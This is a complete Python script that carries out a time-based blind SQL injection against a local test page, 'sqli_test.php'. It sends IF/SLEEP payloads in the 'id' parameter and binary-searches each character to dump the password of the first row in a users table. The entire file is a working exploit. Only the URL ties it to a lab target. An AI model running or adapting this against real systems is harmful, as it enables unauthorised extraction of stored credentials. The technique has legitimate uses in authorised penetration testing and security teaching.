import requests
import time

def is_true(payload, threshold=0.7):
    url = "http://localhost/sqli_test.php"
    full_url = url + "?id=" + payload

    start = time.time()
    r = requests.get(full_url)
    duration = time.time() - start

    print(f"[DEBUG] {payload} → {duration:.2f}s")

    return duration > threshold

def binary_search_char(pos):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"1' AND IF((ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1), {pos}, 1)) > {mid}), SLEEP(1), 0) -- "
        if is_true(payload):
            low = mid + 1
        else:
            payload_eq = f"1' AND IF((ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1), {pos}, 1)) = {mid}), SLEEP(1), 0) -- "
            if is_true(payload_eq):
                return chr(mid)
            else:
                high = mid - 1
    return ''

def dump_field(max_len=50):
    result = ''
    for i in range(1, max_len + 1):
        c = binary_search_char(i)
        if c == '':
            break
        result += c
        print(f"[{i}] -> {c} => {result}")
    return result

print("\n[+] Dump password from user 0:")
password = dump_field()
print("\n✅ Password:", password)
